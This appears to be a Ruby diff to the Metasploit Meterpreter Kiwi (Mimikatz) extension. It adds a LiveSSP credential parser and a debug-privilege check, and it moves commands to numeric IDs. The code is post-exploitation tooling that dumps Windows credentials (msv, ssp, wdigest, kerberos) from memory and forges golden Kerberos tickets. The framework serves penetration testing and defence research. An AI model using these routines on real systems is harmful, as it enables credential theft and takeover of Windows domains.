@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'rex/post/meterpreter/extensions/kiwi/tlv'
+require 'rex/post/meterpreter/extensions/kiwi/command_ids'
 require 'rexml/document'
 require 'set'
 
@@ -21,6 +22,10 @@ module Kiwi
 ###
 
 class Kiwi < Extension
+
+  def self.extension_id
+    EXTENSION_ID_KIWI
+  end
 
   #
   # Typical extension initialization routine.
@@ -43,7 +48,7 @@ class Kiwi < Extension
   end
 
   def exec_cmd(cmd)
-    request = Packet.create_request('kiwi_exec_cmd')
+    request = Packet.create_request(COMMAND_ID_KIWI_EXEC_CMD)
     request.add_tlv(TLV_TYPE_KIWI_CMD, cmd)
     response = client.send_request(request)
     output = response.get_tlv_value(TLV_TYPE_KIWI_CMD_RESULT)
@@ -131,8 +136,16 @@ class Kiwi < Extension
     exec_cmd('lsadump::cache')
   end
 
+  def get_debug_privilege
+    exec_cmd('privilege::debug').strip == "Privilege '20' OK"
+  end
+
   def creds_ssp
     { ssp: parse_ssp(exec_cmd('sekurlsa::ssp')) }
+  end
+
+  def creds_livessp
+    { livessp: parse_livessp(exec_cmd('sekurlsa::livessp')) }
   end
 
   def creds_msv
@@ -156,10 +169,44 @@ class Kiwi < Extension
     {
       msv: parse_msv(output),
       ssp: parse_ssp(output),
+      livessp: parse_livessp(output),
       wdigest: parse_wdigest(output),
       tspkg: parse_tspkg(output),
       kerberos: parse_kerberos(output)
     }
+  end
+
+  # TODO make sure this works as expected
+  def parse_livessp(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an livessp line
+      next if line !~ /\slivessp\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      while line =~ /\[\d+\]/
+        line = lines.shift
+        # then the next 3 lines should be interesting
+        livessp = {}
+        3.times do
+          k, v = read_value(line)
+          livessp[k.strip] = v if k
+          line = lines.shift
+        end
+
+        if livessp.length > 0
+          results[livessp.values.join('|')] = livessp
+        end
+      end
+    end
+
+    results.values
   end
 
   def parse_ssp(output)
@@ -169,7 +216,7 @@ class Kiwi < Extension
     while lines.length > 0 do
       line = lines.shift
 
-      # search for an wdigest line
+      # search for an ssp line
       next if line !~ /\sssp\s:/
 
       line = lines.shift
@@ -349,8 +396,7 @@ class Kiwi < Extension
   #
   # Use the given ticket in the current session.
   #
-  # @param ticket [String] Content of the Kerberos ticket to use.
-  #
+  # @param base64_ticket [String] Content of the Kerberos ticket to use as a Base64 encoded string.
   # @return [void]
   #
   def kerberos_ticket_use(base64_ticket)
@@ -371,12 +417,14 @@ class Kiwi < Extension
   #
   # Create a new golden kerberos ticket on the target machine and return it.
   #
-  # @param opts[:user] [String] Name of the user to create the ticket for.
-  # @param opts[:domain_name] [String] Domain name.
-  # @param opts[:domain_sid] [String] SID of the domain.
-  # @param opts[:krbtgt_hash] [String] The kerberos ticket granting token.
-  # @param opts[:id] [Integer] ID of the user to grant the token for.
-  # @param opts[:group_ids] [Array<Integer>] IDs of the groups to assign to the user
+  # @param opts [Hash] The options to use when creating a new golden kerberos ticket.
+  # @option opts [String] :domain_name Domain name.
+  # @option opts [String] :domain_sid SID of the domain.
+  # @option opts [Integer] :end_in How long to have the ticket last, in hours.
+  # @option opts [Array<Integer>] :group_ids IDs of the groups to assign to the user
+  # @option opts [Integer] :id ID of the user to grant the token for.
+  # @option opts [String] :krbtgt_hash The kerberos ticket granting token.
+  # @option opts [String] :user Name of the user to create the ticket for.
   #
   # @return [Array<Byte>]
   #
